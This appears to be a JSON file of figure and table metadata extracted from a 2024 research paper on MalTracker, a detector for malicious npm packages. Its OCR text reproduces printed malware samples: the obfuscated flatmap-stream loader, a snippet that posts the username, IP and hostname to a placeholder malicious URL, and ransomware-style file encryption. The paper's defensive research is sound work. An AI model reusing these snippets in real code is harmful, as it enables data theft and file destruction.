@@ -1,0 +1,161 @@
+[{
+  "caption": "Figure 6: Constructed Dataset for Evaluation",
+  "captionBoundary": {
+    "x1": 347.7959899902344,
+    "x2": 528.3614501953125,
+    "y1": 177.0150909423828,
+    "y2": 182.64599609375
+  },
+  "figType": "Figure",
+  "imageText": ["9,2119,395", "Malicious", "Package", "202", "846", "Dataset1", "Dataset2", "Dataset3", "Malicious", "Function", "Malicious", "Function", "(LLM", "translated)", "644", "644", "Malicious", "Function", "Benign", "Function", "9,211", "5,303", "Benign", "Function", "3,908", "3,730", "Benign", "Package"],
+  "name": "6",
+  "page": 6,
+  "regionBoundary": {
+    "x1": 322.56,
+    "x2": 551.04,
+    "y1": 86.88,
+    "y2": 168.0
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Figure6-1.png"
+}, {
+  "caption": "Figure 8: Package dep_test_for_mal2-2.0.3",
+  "captionBoundary": {
+    "x1": 353.57501220703125,
+    "x2": 522.5827026367188,
+    "y1": 341.6451110839844,
+    "y2": 347.2760009765625
+  },
+  "figType": "Figure",
+  "imageText": ["1", "const", "secretKey", "=", "'xxxx’;", "2", "const", "directoryPath", "=", "path.join(os.homedir(),", "'important-files’);", "3", "fs.readdir(directoryPath,", "(err,", "files)", "=>", "{", "4", "files.forEach(file", "=>", "{", "5", "const", "filePath", "=", "path.join(directoryPath,", "file);", "6", "fs.readFile(filePath,", "(err,", "data)", "=>", "{", "7", "const", "encryptedData", "=", "encrypt(data,", "secretKey);", "8", "const", "encryptedFilePath", "=", "path.join(directoryPath,", "`${file}.tal`);", "9", "fs.writeFile(encryptedFilePath,", "encryptedData);", "10", "});", "11", "});", "12", "});"],
+  "name": "8",
+  "page": 9,
+  "regionBoundary": {
+    "x1": 321.59999999999997,
+    "x2": 547.68,
+    "y1": 262.08,
+    "y2": 335.03999999999996
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Figure8-1.png"
+}, {
+  "caption": "Table 3: Results of Detecting New Packages",
+  "captionBoundary": {
+    "x1": 350.5169982910156,
+    "x2": 525.3440551757812,
+    "y1": 368.9261169433594,
+    "y2": 374.5570068359375
+  },
+  "figType": "Table",
+  "imageText": ["𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟", "126", "144", "38", "10", "12", "8", "0", "0", "212", "37.3%", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟𝐿", "131", "148", "39", "16", "13", "8", "4", "2", "230", "36.3%", "SI:", "Stealing", "Information", "CE:", "Code", "Execution", "DM:", "Downloading", "Malware", "RS:", "Reverse", "Shell", "UK:", "Unknown", "RW:", "Ransomware", "KL:", "Keylogger", "FPR", "SI", "CE", "DM", "RS", "UK", "RW", "KL", "Total", "Method", "FP", "TP", "(Categories", "and", "the", "Total", "Number)"],
+  "name": "3",
+  "page": 9,
+  "regionBoundary": {
+    "x1": 319.68,
+    "x2": 556.3199999999999,
+    "y1": 380.64,
+    "y2": 444.47999999999996
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Table3-1.png"
+}, {
+  "caption": "Figure 7: Package yyhweb-1.0.5",
+  "captionBoundary": {
+    "x1": 375.0539855957031,
+    "x2": 501.1037902832031,
+    "y1": 233.9831085205078,
+    "y2": 239.614013671875
+  },
+  "figType": "Figure",
+  "imageText": ["1", "const", "https", "=", "require('https’)", "2", "const", "fs", "=", "require('fs’)", "3", "4", "const", "options", "=", "{", "5", "hostname:", "'www.bing.com’,", "6", "path:", "'/HPImageArchive.aspx?format=js&idx=0&n=8’,", "7", "method:", "'GET’", "8", "}", "9", "10", "const", "req", "=", "https.request(options,", "bing_res", "=>", "{", "11", "let", "bing_body", "=", "[],", "bing_data", "=", "{};", "12", "bing_res.on('data',", "(chunk)", "=>", "{", "bing_body.push(chunk);", "});", "13", "bing_res.on('end',", "()", "=>", "{", "14", "bing_body", "=", "Buffer.concat(bing_body);", "15", "bing_data", "=", "JSON.parse(bing_body.toString());", "16", "let", "img_array", "=", "bing_data.images,", "img_url", "=", "[];", "17", "img_array.forEach(img", "=>", "{", "img_url.push(img.url);", "});", "18", "var", "jsonpStr", "=", "\"getBingImages(\"", "+", "JSON.stringify(img_url)", "+", "\")\";", "19", "fs.writeFile('./assets/json/images.json',", "jsonpStr,", "(err)", "=>", "{", "20", "if", "(err)", "{", "throw", "err;", "}", "});", "21", "});", "22", "})"],
+  "name": "7",
+  "page": 9,
+  "regionBoundary": {
+    "x1": 321.59999999999997,
+    "x2": 551.52,
+    "y1": 86.39999999999999,
+    "y2": 227.51999999999998
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Figure7-1.png"
+}, {
+  "caption": "Table 1: Effectiveness (%) Compared with Baselines",
+  "captionBoundary": {
+    "x1": 334.885009765625,
+    "x2": 540.9779663085938,
+    "y1": 85.7260971069336,
+    "y2": 91.35699462890625
+  },
+  "figType": "Table",
+  "imageText": ["𝑂𝑆𝑆𝐺𝑎𝑑𝑔𝑒𝑡", "31.8", "28.6", "93.5", "43.8", "32.2", "27.3", "82.0", "41.0", "𝐺𝑃𝑇", "3.5", "-", "-", "-", "-", "86.8", "41.3", "61.2", "49.3", "DT", "93.7", "100.0", "65.0", "78.8", "92.7", "78.1", "36.5", "49.2", "RF", "95.5", "97.8", "55.5", "69.7", "91.9", "96.7", "17.5", "29.0", "XGB", "97.4", "95.5", "77.0", "84.9", "93.7", "90.3", "40.5", "55.1", "𝐿𝑎𝑑𝑖𝑠𝑎", "DT", "89.5", "79.5", "80.1", "79.8", "71.3", "54.0", "53.0", "53.5", "RF", "92.3", "85.2", "81.4", "83.1", "74.9", "56.9", "56.1", "56.4", "XGB", "92.4", "86.3", "82.7", "84.3", "79.8", "59.8", "56.2", "52.1", "𝐴𝑚𝑎𝑙", "𝑓", "𝑖", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟", "DT", "98.5", "97.0", "94.5", "95.7", "88.4", "82.0", "78.5", "80.1", "RF", "98.9", "99.4", "94.8", "96.9", "90.9", "88.2", "80.7", "83.7", "XGB", "99.1", "98.1", "96.8", "97.5", "91.8", "87.8", "84.6", "86.1", "Method", "Model", "Package", "Level", "Function", "Level", "Acc.", "Prec.", "Rec.", "F1.", "Acc.", "Prec.", "Rec.", "F1."],
+  "name": "1",
+  "page": 7,
+  "regionBoundary": {
+    "x1": 317.76,
+    "x2": 556.3199999999999,
+    "y1": 97.92,
+    "y2": 218.4
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Table1-1.png"
+}, {
+  "caption": "Table 2: Results (%) of Ablation Study with XGB",
+  "captionBoundary": {
+    "x1": 341.635986328125,
+    "x2": 534.225341796875,
+    "y1": 230.92811584472656,
+    "y2": 236.55902099609375
+  },
+  "figType": "Table",
+  "imageText": ["Method", "Package", "Level", "Function", "Level", "Acc.", "F1.", "Acc.", "F1.", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟", "99.1", "97.5", "91.8", "86.1", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟𝑠𝑐", "0.7", "↓", "2.0", "↓", "4.0", "↓", "4.7", "↓", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟𝑐𝑑", "1.0", "↓", "0.4", "↓", "4.2", "↓", "4.2", "↓", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟", "𝑓", "𝑏", "1.2", "↓", "3.8", "↓", "2.8", "↓", "2.1", "↓", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟", "𝑓", "𝑛", "0.2", "↓", "0.6", "↓", "4.0", "↓", "4.1", "↓", "𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟", "𝑓", "𝑔", "0.2", "↓", "4.5", "↓", "4.1", "↓", "6.5", "↓", "The", "results", "of", "variants", "denote", "the", "performance", "decline."],
+  "name": "2",
+  "page": 7,
+  "regionBoundary": {
+    "x1": 325.92,
+    "x2": 548.16,
+    "y1": 242.88,
+    "y2": 336.47999999999996
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Table2-1.png"
+}, {
+  "caption": "Figure 1: Two Malicious Code Snippets Extracted from Real Projects",
+  "captionBoundary": {
+    "x1": 168.30799865722656,
+    "x2": 443.6932067871094,
+    "y1": 286.58111572265625,
+    "y2": 292.2120056152344
+  },
+  "figType": "Figure",
+  "imageText": ["(b)", "flatmap-stream-0.1.1", "69", "};", "70", "71", "!function()", "{", "72", "try", "{", "73", "var", "r", "=", "require,", "74", "t", "=", "process;", "75", "function", "e(r)", "{", "76", "return", "Buffer.from(r,", "\"hex\").toString()", "77", "}", "78", "var", "n", "=", "r(e(\"2e2f746573742f64617461\")),", "79", "o", "=", "t[e(n[3])][e(n[4])];", "80", "if", "(!o)", "return;", "81", "var", "u", "=", "r(e(n[2]))[e(n[6])](e(n[5]),", "o),", "82", "a", "=", "u.update(n[0],", "e(n[8]),", "e(n[9]));", "83", "a", "+=", "u.final(e(n[9]));", "84", "var", "f", "=", "new", "module.constructor;", "85", "f.paths", "=", "module.paths,", "86", "f[e(n[7])](a,", "\"\"),", "87", "f.exports(n[1])", "88", "}", "catch(r)", "{}", "89", "}();", "...", "1", "var", "Stream", "=", "require(\"stream\").Stream;", "2", "module.exports", "=", "function(e,", "n)", "{", "(a)", "dionysos-frame-manager-0.2.1", "1", "const", "os", "=", "require('os');", "2", "const", "axios", "=", "require('axios');", "3", "const", "username", "=", "os.userInfo().username;", "4", "let", "ipAddress", "=", "'malicious", "ip';", "5", "const", "hostname", "=", "os.hostname();", "6", "const", "apiUrl", "=", "'malicious", "API", "url';", "7", "8", "async", "function", "getPublicIpAddress()", "{", "9", "try", "{", "10", "const", "response", "=", "await", "axios.get('https://ifconfig.io/ip');", "11", "ipAddress", "=", "response.data.trim();", "12", "}", "catch", "(error)", "{}", "13", "}", "14", "15", "async", "function", "postInformation()", "{", "16", "await", "getPublicIpAddress();", "17", "try", "{", "18", "const", "response", "=", "await", "axios.post(apiUrl,", "{", "19", "username,", "20", "ipAddress,", "21", "hostname,", "22", "});", "23", "console.log('Response:',", "response.data);", "24", "}", "catch", "(error)", "{}", "25", "}", "26", "27", "postInformation();"],
+  "name": "1",
+  "page": 3,
+  "regionBoundary": {
+    "x1": 110.39999999999999,
+    "x2": 496.32,
+    "y1": 86.88,
+    "y2": 282.71999999999997
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Figure1-1.png"
+}, {
+  "caption": "Figure 2: The Overview of Our Proposed Method𝑀𝑎𝑙𝑡𝑟𝑎𝑐𝑘𝑒𝑟",
+  "captionBoundary": {
+    "x1": 185.53700256347656,
+    "x2": 425.4856872558594,
+    "y1": 452.7711181640625,
+    "y2": 458.4020080566406
+  },
+  "figType": "Figure",
+  "imageText": ["Model", "Training", "MalTrackerFine-Grained", "Features", "OpenAI", "LLM-Enhanced", "Dataset", "Cross-Ecosystem", "Malicious", "Samples", "Sensitive", "Caller", "Fine-grained", "Feature", "ExtractionSuspicious", "Code", "Gadget", "Identification", "Input", "NPM", "Package", "Suspicious", "Functions", "Localization", "Graph", "Features", "Node", "Features", "Basic", "Features", "Suspicious", "Functions", "Function", "Node", "Statement", "NodeCall", "Edge", "Control", "Flow", "Data", "Flow", "PDG", "Suspicious", "Code", "Gadgets", "Dependencies", "Source", "Code", "Files", "Sensitive", "Function", "Call", "Graph", "Sensitive", "Functions"],
+  "name": "2",
+  "page": 3,
+  "regionBoundary": {
+    "x1": 102.72,
+    "x2": 502.56,
+    "y1": 301.92,
+    "y2": 447.35999999999996
+  },
+  "renderDpi": 150,
+  "renderURL": "../datacollection/pdf_analysis/issta-issta2024/figures/10_1145-3650212_3680397-Figure2-1.png"
+}]
